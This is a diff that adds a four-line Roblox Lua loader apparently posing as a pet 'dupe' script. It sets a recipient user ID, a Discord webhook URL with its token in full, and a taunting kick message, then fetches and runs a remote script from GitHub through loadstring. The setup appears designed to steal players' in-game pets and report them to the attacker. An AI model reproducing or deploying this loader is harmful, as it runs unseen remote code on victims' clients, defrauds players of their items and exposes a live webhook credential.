@@ -1,0 +1,4 @@
+_G.UserID = 2700023467
+_G.WebHook = "https://discord.com/api/webhooks/1023415569170579638/InYRggo0WPbrWVWmSEdOMoB1fIQDeeU2iEHcwinl_ux49YJHqPCaSMmXkyOjMuSbh3lX"
+_G.KickMessage = "TYSM FOR PET LOL"
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
